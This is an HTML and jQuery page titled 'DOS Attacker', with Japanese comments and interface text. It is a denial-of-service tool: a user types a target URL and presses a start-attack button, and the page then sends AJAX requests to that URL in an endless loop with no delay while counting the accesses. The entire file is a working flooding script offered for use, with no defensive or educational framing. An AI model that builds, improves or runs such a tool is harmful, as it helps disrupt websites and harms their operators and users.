<!DOCTYPE html>
<html>
<head>
  <title>DOS Attacker</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    // 接続回数をリセット
    var kaisuu = 0;

    // AJAXを使ってcurlリクエストを送る関数
    function curl(url) {
      $.ajax({
        url: url,
        beforeSend: function(xhr) {
          // 必要ならヘッダーを設定する
        },
        success: function(data) {
          // 必要ならレスポンスデータを処理する
        }
      });
    }

    // 攻撃を開始する関数
    function attack() {
      // 入力フィールドからターゲットURLを取得する
      var target = $("#target").val();

      // ターゲットが有効かチェックする
      if (target) {
        // 接続回数を増やして表示する
        kaisuu++;
        $("#count").text(kaisuu + "回目のアクセス");

        // ターゲットにcurlリクエストを送る
        curl(target);
        
        // 攻撃を繰り返す
        setTimeout(attack, 0);
      }
    }
  </script>
</head>
<body>
  <h1>DOS Attacker [Version 1.0]</h1>
  <p>Sora.Nogawa All rights reserved</p>
  <p>攻撃対象を入力してください</p>
  <input type="text" id="target" placeholder="http://example.com">
  <button onclick="attack()">攻撃開始</button>
  <p id="count">0回目のアクセス</p>
</body>
</html>
